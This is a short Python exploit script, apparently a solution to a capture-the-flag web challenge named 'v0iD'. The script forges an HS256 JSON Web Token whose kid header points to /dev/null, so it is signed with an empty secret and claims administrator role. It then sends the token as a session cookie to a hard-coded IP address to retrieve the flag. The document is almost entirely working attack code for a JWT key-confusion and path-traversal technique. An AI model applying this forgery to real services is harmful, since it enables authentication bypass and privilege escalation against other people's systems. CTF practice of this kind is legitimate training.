#!/usr/bin/env python3
"""
v0iD CTF Challenge - JWT kid Path Traversal + Privilege Escalation
UniVsThreats26Quals - Web
"""

import jwt
import requests
import re
import warnings
warnings.filterwarnings('ignore')

HOST = "194.102.62.166"
PORT = 29604
BASE = f"http://{HOST}:{PORT}"

def exploit():
    print("[*] v0iD - JWT kid Path Traversal Exploit")
    print("="*50)
# Forge JWT with kid=/dev/null (empty secret) and sub=administrator
    token = jwt.encode(
        {'sub': 'administrator', 'role': 'admin', 'iat': 1772184187},
        '',  # empty secret — /dev/null returns empty content
        algorithm='HS256',
        headers={'alg': 'HS256', 'typ': 'JWT', 'kid': '/dev/null'}
    )
    print(f"[+] Forged JWT: {token}")
# Access /flag with forged token
    r = requests.get(f'{BASE}/flag', cookies={'session': token}, allow_redirects=False, timeout=10)

    if r.status_code == 200:
        flags = re.findall(r'UVT\{[^}]+\}', r.text)
        if flags:
            print(f"[+] FLAG: {flags[0]}")
            return flags[0]

    print(f"[-] Failed: HTTP {r.status_code}")
    return None

if __name__ == "__main__":
    exploit()
